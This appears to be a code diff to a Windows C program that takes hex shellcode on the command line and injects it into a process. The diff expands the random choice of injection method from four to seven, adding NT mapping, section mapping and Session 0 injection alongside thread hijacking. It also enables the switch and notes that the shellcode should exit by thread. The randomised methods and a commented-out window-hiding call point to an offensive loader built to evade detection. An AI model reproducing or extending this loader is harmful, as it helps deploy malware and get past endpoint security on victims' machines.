@@ -7,7 +7,7 @@ int main(int argc, char* argv[]) {
     //ShowWindow( hWnd, SW_HIDE );
     if (argc <2)
     {
-        printf("usage: ./this.exe <hex-shellcode>\n");
+        printf("usage: ./this.exe <hex-shellcode> Ps:Please use shellcode with exit method thread \n");
         return 0;
     }
     unsigned int char_in_hex;
@@ -32,9 +32,10 @@ int main(int argc, char* argv[]) {
    
     srand((unsigned int)GetCurrentProcessId());
 
-    int random = rand()%4;
-    NtMapInjection(lpShellcode, memory_allocation);
-    /*
+    int random = rand()%7;
+   
+
+    
     switch (random)
     {
     case 0:
@@ -49,7 +50,17 @@ int main(int argc, char* argv[]) {
     case 3:
         ThreadHijack(lpShellcode, memory_allocation);
         break;
+    case 4:
+        NtMapInjection(lpShellcode, memory_allocation);
+        break;
+    case 5:
+        MapingInjection(lpShellcode, memory_allocation);
+        break;
+    case 6:
+        Session0Injection(lpShellcode, memory_allocation);
+        break;
+
     }
-    */
+    
     return 0;
 }
